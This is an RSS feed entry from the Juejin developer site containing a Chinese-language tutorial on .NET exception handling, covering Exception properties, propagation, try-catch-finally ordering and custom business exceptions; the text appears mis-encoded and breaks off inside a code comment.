<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Exceptionå¼‚å¸¸ä¸å¼‚å¸¸å¤„ç†(.Net)]]></title>    <link>https://juejin.cn/post/7595030559565021235</link>    <guid>https://juejin.cn/post/7595030559565021235</guid>    <pubDate>2026-01-14T14:46:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595030559565021235" data-draft-id="7595041883145420846" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Exceptionå¼‚å¸¸ä¸å¼‚å¸¸å¤„ç†(.Net)"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-14T14:46:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸ƒå…«æ˜Ÿå¤©"/> <meta itemprop="url" content="https://juejin.cn/user/3848733848768205"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Exceptionå¼‚å¸¸ä¸å¼‚å¸¸å¤„ç†(.Net)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3848733848768205/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸ƒå…«æ˜Ÿå¤©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:46:33.000Z" title="Wed Jan 14 2026 14:46:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Exceptionï¼ˆå¼‚å¸¸ï¼‰</h2>
<h3 data-id="heading-1">Exceptionï¼ˆå¼‚å¸¸ï¼‰æ˜¯ä»€ä¹ˆ</h3>
<h4 data-id="heading-2">1.1 åŸºæœ¬æ¦‚å¿µ</h4>
<p>Exceptionæ˜¯ç¨‹åºè¿è¡Œæ—¶å‘ç”Ÿçš„å¼‚å¸¸æƒ…å†µçš„è¡¨ç¤ºã€‚å½“ç¨‹åºæ‰§è¡Œä¸­é‡åˆ°é”™è¯¯æˆ–æ„å¤–æƒ…å†µæ—¶ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p>
<pre><code class="hljs language-php" lang="php">ç¨‹åºæ­£å¸¸æµç¨‹ â”€â”€â†’ å‘ç”Ÿé”™è¯¯ â”€â”€â†’ æŠ›å‡º<span class="hljs-built_in">Exception</span> â”€â”€â†’ ä¸­æ–­æ‰§è¡Œ â”€â”€â†’ å¯»æ‰¾å¼‚å¸¸å¤„ç†å™¨(<span class="hljs-keyword">catch</span>) â”€â”€â†’ æ¢å¤æˆ–è®°å½•
</code></pre>
<h4 data-id="heading-3">1.2 Exceptionç±»</h4>
<blockquote>
<p><code>System.Exception</code>ä½œä¸ºæ‰€æœ‰å¼‚å¸¸çš„åŸºç±»ï¼Œæ˜¯é”™è¯¯å¤„ç†çš„æ ¸å¿ƒæœºåˆ¶</p>
</blockquote>
<ul>
<li>
<p><code>Message</code>ç”¨æ¥æè¿°å¼‚å¸¸åŸå› çš„è¯¦ç»†ä¿¡æ¯</p>
<ul>
<li>å¦‚æœä½ æ•æ‰åˆ°äº†å¼‚å¸¸ï¼Œä¸€èˆ¬ä½¿ç”¨è¿™æ®µæè¿°èƒ½çŸ¥é“å‘ç”Ÿçš„å¤§è‡´åŸå› ã€‚</li>
<li>å¦‚æœä½ å‡†å¤‡æŠ›å‡ºå¼‚å¸¸ï¼Œåœ¨è¿™ä¸ªä¿¡æ¯é‡Œé¢è®°å½•èƒ½å¸®åŠ©è°ƒè¯•é—®é¢˜çš„è¯¦ç»†æ–‡å­—ä¿¡æ¯ã€‚</li>
</ul>
</li>
<li>
<p><code>StackTrace</code> åŒ…å«ç”¨æ¥ç¡®å®šé”™è¯¯ä½ç½®çš„å †æ ˆè·Ÿè¸ªï¼ˆå½“æœ‰è°ƒè¯•ä¿¡æ¯å¦‚ PDB æ—¶ï¼Œè¿™é‡Œå°±ä¼šåŒ…å«æºä»£ç æ–‡ä»¶åå’Œæºä»£ç è¡Œå·ï¼‰</p>
</li>
<li>
<p><code>InnerException</code> åŒ…å«å†…éƒ¨å¼‚å¸¸ä¿¡æ¯</p>
</li>
<li>
<p><code>Source</code> è¿™ä¸ªå±æ€§åŒ…å«å¯¼è‡´é”™è¯¯çš„åº”ç”¨ç¨‹åºæˆ–å¯¹è±¡çš„åç§°</p>
</li>
<li>
<p><code>Data</code> è¿™æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå¯ä»¥å­˜æ”¾åŸºäºé”®å€¼çš„ä»»æ„æ•°æ®ï¼Œå¸®åŠ©åœ¨å¼‚å¸¸ä¿¡æ¯ä¸­è·å¾—æ›´å¤šå¯ä»¥ç”¨äºè°ƒè¯•çš„æ•°æ®</p>
</li>
<li>
<p><code>HelpLink</code> è¿™æ˜¯ä¸€ä¸ª urlï¼Œè¿™ä¸ª url é‡Œå¯ä»¥æä¾›å¤§é‡ç”¨äºè¯´æ˜æ­¤å¼‚å¸¸åŸå› çš„ä¿¡æ¯</p>
</li>
</ul>
<h4 data-id="heading-4">1.3 å¼•å‘å¼‚å¸¸</h4>
<p>å¼•å‘å¼‚å¸¸ä½¿ç”¨ <code>throw</code> å…³é”®å­—ã€‚åªæ˜¯æ³¨æ„å¦‚æœè¦é‡æ–°æŠ›å‡ºå¼‚å¸¸ï¼Œè¯·ä½¿ç”¨ <code>throw;</code> è¯­å¥æˆ–è€…å°†åŸæœ‰å¼‚å¸¸ä½œä¸ºå†…éƒ¨å¼‚å¸¸ã€‚</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> ex)
 Â  Â  Â  Â  Â   {
 Â  Â  Â  Â  Â  Â  Â   <span class="hljs-comment">//throw ex; //ä¼šä¸¢å¤±è°ƒç”¨é“¾,æ‰¾ä¸åˆ°çœŸæ­£çš„å¼‚å¸¸æ‰€åœ¨</span>
 Â  Â  Â  Â  Â  Â  Â   <span class="hljs-comment">//throw; //è°ƒç”¨é“¾å®Œæ•´</span>
 Â  Â  Â  Â  Â  Â  Â   <span class="hljs-comment">//ExceptionDispatchInfo.Capture(ex).Throw();//è°ƒç”¨é“¾æ›´å®Œæ•´ï¼Œæ˜¾ç¤ºäº†é‡æ–°æŠ›å‡ºå¼‚å¸¸æ‰€åœ¨çš„ä½ç½®ã€‚</span>
 Â  Â  Â  Â  Â   }
</code></pre>
<h2 data-id="heading-5">å¼‚å¸¸å¤„ç†çš„æœ¬è´¨</h2>
<pre><code class="hljs">å¼‚å¸¸å¤„ç† = å¼‚å¸¸æ‹¦æˆªå™¨
â€‹
ç›®æ ‡ï¼šæ‹¦æˆªå¼‚å¸¸ â†’ æ¶ˆé™¤çœŸæ­£çš„æŠ›é”™ â†’ è¿”å›å¯æ§çš„ç»“æœ â†’ ç¨‹åºç»§ç»­è¿è¡Œ
â€‹
âŒ æ²¡æœ‰å¤„ç†ï¼šå¼‚å¸¸ä¸æ–­å‘ä¸Šä¼ æ’­ â†’ æœ€ç»ˆå‡»æºƒç³»ç»Ÿ
âœ… æœ‰å¤„ç†ï¼šå¼‚å¸¸è¢«æ‹¦æˆª â†’ è½¬åŒ–ä¸ºè¿”å›å€¼ â†’ ç³»ç»Ÿç»§ç»­è¿è¡Œ
</code></pre>
<p><strong>æ ¸å¿ƒæ€æƒ³</strong>ï¼š</p>
<ul>
<li>å¼‚å¸¸å¹¶ä¸å¯æ€•ï¼Œå¯æ€•çš„æ˜¯è®©å¼‚å¸¸ä¸å—æ§åˆ¶åœ°ä¼ æ’­</li>
<li>try-catch çš„ä½œç”¨å°±æ˜¯åœ¨å¼‚å¸¸ä¼ æ’­çš„è¿‡ç¨‹ä¸­"æˆªä½"å®ƒ</li>
<li>æˆªä½ä»¥åï¼Œä½ å¯ä»¥ï¼šè®°å½•æ—¥å¿—ã€è½¬æˆ JSONã€è½¬æˆçŠ¶æ€ç ã€å¿½ç•¥å®ƒ...</li>
<li>ä½†æ— è®ºå¦‚ä½•å¤„ç†ï¼Œç›®çš„éƒ½æ˜¯ä¸€æ ·çš„ï¼š<strong>æ¶ˆé™¤çœŸæ­£çš„æŠ›é”™</strong></li>
</ul>
<p>æ³¨æ„:</p>
<pre><code class="hljs language-erlang" lang="erlang">æ§åˆ¶å°é¡¹ç›®ç¨‹åºä¸­æŠ›é”™ç›´æ¥å¯¼è‡´ç¨‹åºé€€å‡º
â€‹
.net Core Web APIé¡¹ç›®æŠ›é”™,æœ‰æœ€åº•å±‚çš„æŠ›é”™æ‹¦æˆªå…œåº•,å› æ­¤ä¸ä¼šç›´æ¥ç¨‹åºé€€å‡º.
</code></pre>
<hr/>
<h3 data-id="heading-6">1. å¼‚å¸¸çš„å±‚æ¬¡ç»“æ„</h3>
<h4 data-id="heading-7">1.1 . NET å¼‚å¸¸ä½“ç³»</h4>
<pre><code class="hljs language-php" lang="php">System.<span class="hljs-built_in">Exception</span> (æ‰€æœ‰å¼‚å¸¸çš„åŸºç±»)
â”‚
â”œâ”€â”€ <span class="hljs-title function_ invoke__">SystemException</span> (ç³»ç»Ÿå¼‚å¸¸)
â”‚ Â  â”œâ”€â”€ NullReferenceException Â  Â  Â  Â  <span class="hljs-comment"># ç©ºå¼•ç”¨</span>
â”‚ Â  â”œâ”€â”€ IndexOutOfRangeException Â  Â  Â  <span class="hljs-comment"># æ•°ç»„è¶Šç•Œ</span>
â”‚ Â  â”œâ”€â”€ InvalidOperationException Â  Â   <span class="hljs-comment"># æ— æ•ˆæ“ä½œ</span>
â”‚ Â  â”œâ”€â”€ ArgumentException Â  Â  Â  Â  Â  Â   <span class="hljs-comment"># å‚æ•°å¼‚å¸¸</span>
â”‚ Â  â”‚ Â  â”œâ”€â”€ ArgumentNullException Â  Â   <span class="hljs-comment"># å‚æ•°ä¸ºnull</span>
â”‚ Â  â”‚ Â  â””â”€â”€ ArgumentOutOfRangeException <span class="hljs-comment"># å‚æ•°è¶…èŒƒå›´</span>
â”‚ Â  â””â”€â”€ DivideByZeroException Â  Â  Â  Â   <span class="hljs-comment"># é™¤é›¶</span>
â”‚
â””â”€â”€ <span class="hljs-title function_ invoke__">ApplicationException</span> (åº”ç”¨ç¨‹åºå¼‚å¸¸ - ä¸æ¨èç›´æ¥ä½¿ç”¨)
 Â   â””â”€â”€ è‡ªå®šä¹‰ä¸šåŠ¡å¼‚å¸¸... 
</code></pre>
<h4 data-id="heading-8">1.2 å¼‚å¸¸ç»§æ‰¿å…³ç³»é‡è¦æ€§</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// âŒ ä¸å¥½çš„åšæ³•ï¼šæ•è·åŸºç±»å¼‚å¸¸</span>
<span class="hljs-keyword">try</span> { ... }
<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> ex)
{
 Â  Â <span class="hljs-comment">// ä»€ä¹ˆå¼‚å¸¸éƒ½æ•è·ï¼Œæ— æ³•åŒºåˆ«å¯¹å¾…</span>
}
â€‹
<span class="hljs-comment">// âœ… å¥½çš„åšæ³•ï¼šæŒ‰å¼‚å¸¸ç±»å‹åˆ†åˆ«å¤„ç†</span>
<span class="hljs-keyword">try</span> { ... }
<span class="hljs-keyword">catch</span> (ArgumentNullException ex)
{
 Â  Â <span class="hljs-comment">// å¤„ç†å‚æ•°ä¸º null çš„æƒ…å†µ</span>
}
<span class="hljs-keyword">catch</span> (ArgumentException ex)
{
 Â  Â <span class="hljs-comment">// å¤„ç†å…¶ä»–å‚æ•°å¼‚å¸¸</span>
}
<span class="hljs-keyword">catch</span> (NotFoundException ex)
{
 Â  Â <span class="hljs-comment">// å¤„ç†èµ„æºä¸å­˜åœ¨</span>
}
<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> ex)
{
 Â  Â <span class="hljs-comment">// æœ€åæ•è·æœªé¢„æœŸçš„å¼‚å¸¸</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-9">2. å¼‚å¸¸ä¼ æ’­æœºåˆ¶ï¼ˆé‡è¦ï¼ï¼‰</h3>
<h4 data-id="heading-10">2.1 å¼‚å¸¸çš„ä¼ æ’­è¿‡ç¨‹</h4>
<pre><code class="hljs language-arduino" lang="arduino">è°ƒç”¨æ ˆï¼ˆä»ä¸Šå¾€ä¸‹æ‰§è¡Œï¼‰ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  <span class="hljs-built_in">Main</span>() Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  â”‚  â† æœ€é¡¶å±‚ï¼ˆåº”ç”¨å…¥å£ï¼‰
â”‚ Â  â†“ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  â”‚
â”‚  <span class="hljs-built_in">MethodA</span>() Â  Â  Â  Â  Â  Â  Â  Â   â”‚
â”‚ Â  â†“ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  â”‚
â”‚  <span class="hljs-built_in">MethodB</span>() Â  Â  Â  Â  Â  Â  Â  Â   â”‚
â”‚ Â  â†“ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  â”‚
â”‚  <span class="hljs-built_in">MethodC</span>()  â† <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ...  â”‚  â† å¼‚å¸¸å‘ç”Ÿç‚¹ ğŸ’¥
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â€‹
å¼‚å¸¸ä¼ æ’­ï¼ˆä»ä¸‹å¾€ä¸Šé€ƒé€¸ï¼‰ï¼š
ğŸ’¥ MethodC äº§ç”Ÿå¼‚å¸¸
  â†“
â“ MethodC æ²¡æœ‰ <span class="hljs-keyword">catch</span> â†’ å¼‚å¸¸ç»§ç»­å‘ä¸Šä¼ æ’­
  â†“
â“ MethodB æ²¡æœ‰ <span class="hljs-keyword">catch</span> â†’ å¼‚å¸¸ç»§ç»­å‘ä¸Šä¼ æ’­
  â†“
â“ MethodA æ²¡æœ‰ <span class="hljs-keyword">catch</span> â†’ å¼‚å¸¸ç»§ç»­å‘ä¸Šä¼ æ’­
  â†“
â“ Main æ²¡æœ‰ <span class="hljs-keyword">catch</span> â†’ å¼‚å¸¸ç»§ç»­å‘ä¸Šä¼ æ’­
  â†“
â“ æ¡†æ¶æœ€åä¸€å±‚ <span class="hljs-keyword">catch</span>ï¼ˆå¦‚æœæœ‰ï¼‰â†’ å¯èƒ½è¢«æ‹¦æˆª
  â†“
âŒ éƒ½æ²¡æœ‰ <span class="hljs-keyword">catch</span> â†’ ç¨‹åºå´©æºƒï¼
</code></pre>
<h4 data-id="heading-11">2.2 å¼‚å¸¸è¢«æ‹¦æˆªçš„æƒ…å†µ</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// åœ¨æŸä¸€å±‚è¢« catch äº†</span>
<span class="hljs-built_in">MethodC</span>()
{
 Â  Â throw new <span class="hljs-built_in">Exception</span>(); Â <span class="hljs-comment">// ğŸ’¥ å¼‚å¸¸äº§ç”Ÿ</span>
}
â€‹
<span class="hljs-built_in">MethodB</span>()
{
 Â  Â try
 Â   {
 Â  Â  Â  Â <span class="hljs-built_in">MethodC</span>(); Â <span class="hljs-comment">// è°ƒç”¨å¯èƒ½æŠ›å¼‚å¸¸çš„æ–¹æ³•</span>
 Â   }
 Â  Â catch (Exception ex) Â <span class="hljs-comment">// ğŸ›‘ å¼‚å¸¸åœ¨è¿™é‡Œè¢«æ‹¦æˆªï¼</span>
 Â   {
 Â  Â  Â  Â Console<span class="hljs-selector-class">.WriteLine</span>("å¼‚å¸¸å·²å¤„ç†");
 Â  Â  Â  Â <span class="hljs-comment">// å¼‚å¸¸ä¸å†å‘ä¸Šä¼ æ’­</span>
 Â   }
 Â  Â Console<span class="hljs-selector-class">.WriteLine</span>("ç¨‹åºç»§ç»­è¿è¡Œ"); Â <span class="hljs-comment">// âœ… è¿™è¡Œä¼šæ‰§è¡Œ</span>
}
â€‹
<span class="hljs-built_in">MethodA</span>()
{
 Â  Â <span class="hljs-built_in">MethodB</span>(); Â <span class="hljs-comment">// æ²¡æœ‰å¼‚å¸¸ï¼Œæ­£å¸¸æ‰§è¡Œ</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-12">3. Try-Catch åŸºç¡€ç”¨æ³•</h3>
<h4 data-id="heading-13">3.1 åŸºæœ¬ç»“æ„</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">try</span>
{
    <span class="hljs-comment">// å¯èƒ½æŠ›å‡ºå¼‚å¸¸çš„ä»£ç </span>
    DoSomethingDangerous();
}
<span class="hljs-keyword">catch</span> (SpecificException ex)
{
    <span class="hljs-comment">// å¤„ç†ç‰¹å®šå¼‚å¸¸</span>
    Console.WriteLine(<span class="hljs-string">$"æ•è·ç‰¹å®šå¼‚å¸¸: <span class="hljs-subst">{ex.Message}</span>"</span>);
}
<span class="hljs-keyword">catch</span> (Exception ex)
{
    <span class="hljs-comment">// å¤„ç†æ‰€æœ‰å…¶ä»–å¼‚å¸¸ï¼ˆèŒƒå›´æœ€å¤§ï¼Œå¿…é¡»æ”¾åœ¨æœ€åï¼‰</span>
    Console. WriteLine(<span class="hljs-string">$"æ•è·é€šç”¨å¼‚å¸¸: <span class="hljs-subst">{ex.Message}</span>"</span>);
}
<span class="hljs-keyword">finally</span>
{
    <span class="hljs-comment">// æ— è®ºæ˜¯å¦å‘ç”Ÿå¼‚å¸¸éƒ½ä¼šæ‰§è¡Œ</span>
    <span class="hljs-comment">// é€šå¸¸ç”¨äºèµ„æºæ¸…ç†ï¼ˆé‡Šæ”¾æ•°æ®åº“è¿æ¥ã€æ–‡ä»¶å¥æŸ„ç­‰ï¼‰</span>
    Console.WriteLine(<span class="hljs-string">"æ¸…ç†èµ„æº"</span>);
}

<span class="hljs-comment">// æ‰§è¡Œé¡ºåºï¼š</span>
<span class="hljs-comment">// 1. æ‰§è¡Œ try å—</span>
<span class="hljs-comment">// 2. å¦‚æœæœ‰å¼‚å¸¸ï¼šæ‰§è¡ŒåŒ¹é…çš„ catch å—</span>
<span class="hljs-comment">// 3. æœ€åæ‰§è¡Œ finally å—</span>
<span class="hljs-comment">// 4. ç»§ç»­æ‰§è¡Œåç»­ä»£ç </span>
</code></pre>
<h4 data-id="heading-14">3.2 å¼‚å¸¸ä¿¡æ¯</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">try</span> { ... }
<span class="hljs-keyword">catch</span> (Exception ex)
{
    <span class="hljs-comment">// å¸¸ç”¨å±æ€§</span>
    ex.Message              <span class="hljs-comment">// å¼‚å¸¸æè¿°ä¿¡æ¯</span>
    ex. StackTrace           <span class="hljs-comment">// å †æ ˆè·Ÿè¸ªï¼ˆè°ƒç”¨é“¾ï¼‰</span>
    ex.InnerException       <span class="hljs-comment">// å†…éƒ¨å¼‚å¸¸ï¼ˆå¼‚å¸¸é“¾ï¼‰</span>
    ex.GetType().Name       <span class="hljs-comment">// å¼‚å¸¸ç±»å‹åç§°</span>
    
    <span class="hljs-comment">// å®é™…ä½¿ç”¨</span>
    Console.WriteLine(<span class="hljs-string">$"å¼‚å¸¸ç±»å‹: <span class="hljs-subst">{ex.GetType().Name}</span>"</span>);
    Console.WriteLine(<span class="hljs-string">$"å¼‚å¸¸ä¿¡æ¯: <span class="hljs-subst">{ex.Message}</span>"</span>);
    Console.WriteLine(<span class="hljs-string">$"å †æ ˆè·Ÿè¸ª: <span class="hljs-subst">{ex. StackTrace}</span>"</span>);
}
</code></pre>
<h4 data-id="heading-15">3.3 Catch çš„é¡ºåºå¾ˆé‡è¦</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// âŒ é”™è¯¯çš„åšæ³•ï¼šé€šç”¨å¼‚å¸¸åœ¨å‰é¢</span>
<span class="hljs-keyword">try</span> { ... }
<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> ex)  <span class="hljs-comment">// âŒ æ•è·æ‰€æœ‰å¼‚å¸¸</span>
{
    <span class="hljs-comment">// è¿™ä¼šæ‹¦æˆªä¸‹é¢æ‰€æœ‰çš„ catchï¼Œå®ƒä»¬æ°¸è¿œä¸ä¼šæ‰§è¡Œ</span>
}
<span class="hljs-keyword">catch</span> (NotFoundException ex)  <span class="hljs-comment">// âŒ æ°¸è¿œåˆ°ä¸äº†è¿™é‡Œ</span>
{
    <span class="hljs-comment">// æ­»ä»£ç ï¼</span>
}

<span class="hljs-comment">// âœ… æ­£ç¡®çš„åšæ³•ï¼šå…·ä½“å¼‚å¸¸åœ¨å‰é¢ï¼Œé€šç”¨å¼‚å¸¸åœ¨åé¢</span>
<span class="hljs-keyword">try</span> { ... }
<span class="hljs-keyword">catch</span> (NotFoundException ex)  <span class="hljs-comment">// âœ… å…ˆå¤„ç†å…·ä½“å¼‚å¸¸</span>
{
}
<span class="hljs-keyword">catch</span> (ArgumentException ex)  <span class="hljs-comment">// âœ… å†å¤„ç†æ›´é€šç”¨çš„å¼‚å¸¸</span>
{
}
<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> ex)  <span class="hljs-comment">// âœ… æœ€åå¤„ç†æœ€é€šç”¨çš„å¼‚å¸¸</span>
{
}
</code></pre>
<h2 data-id="heading-16">è‡ªå®šä¹‰å¼‚å¸¸ä¸å…¨å±€å¼‚å¸¸å¤„ç†</h2>
<h3 data-id="heading-17">è‡ªå®šä¹‰å¼‚å¸¸</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> ä¸šåŠ¡å¼‚å¸¸åŸºç±»</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> æ‰€æœ‰è‡ªå®šä¹‰å¼‚å¸¸éƒ½ç»§æ‰¿è¿™ä¸ªç±»</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title">BusinessException</span> : <span class="hljs-title">Exception</span>
{
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> HTTP çŠ¶æ€ç </span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ğŸ”‘ è¿™æ˜¯å…³é”®ï¼šå¼‚å¸¸ç±»å®šä¹‰ HTTP çŠ¶æ€ç æ˜¯å¤šå°‘</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ç”±å…·ä½“å­ç±»è¦†ç›–è¿™ä¸ªå±æ€§æ¥æŒ‡å®šå„è‡ªçš„çŠ¶æ€ç </span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> </span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ä¾‹å¦‚ï¼š</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> - NotFoundException è¿”å› 404</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> - ValidationException è¿”å› 400</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> - è¿™æ ·ä¸­é—´ä»¶å°±çŸ¥é“åº”è¯¥è¿”å›ä»€ä¹ˆçŠ¶æ€ç äº†</span>
